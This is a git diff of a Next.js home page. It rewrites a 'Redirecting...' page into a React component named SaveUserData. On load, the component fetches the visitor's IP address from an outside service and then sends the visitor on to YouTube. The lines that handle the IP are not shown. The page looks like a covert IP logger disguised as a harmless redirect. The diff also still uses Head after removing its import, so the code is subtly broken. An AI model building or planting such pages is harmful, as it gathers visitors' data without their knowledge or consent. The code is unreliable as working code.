@@ -1,17 +1,7 @@
-import Head from 'next/head'
-import Header from '@components/Header'
-import Footer from '@components/Footer'
+import { useEffect } from 'react';
 
-export default function Home() {
-  return (
-    <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-</head>
-<body>
-  <script>
+const SaveUserData = () => {
+  useEffect(() => {
     // Get user's IP address
     var userIP;
     fetch('https://api.ipify.org/?format=json')
@@ -35,8 +25,19 @@ export default function Home() {
             window.location.href = 'https://www.youtube.com';
           });
       });
-  </script>
-</body>
-</html>
-  )
+  }, []);
+
+  return null;
+};
+
+export default function Home() {
+  return (
+    <>
+      <Head>
+        <title>Redirecting...</title>
+      </Head>
+
+      <SaveUserData />
+    </>
+  );
 }
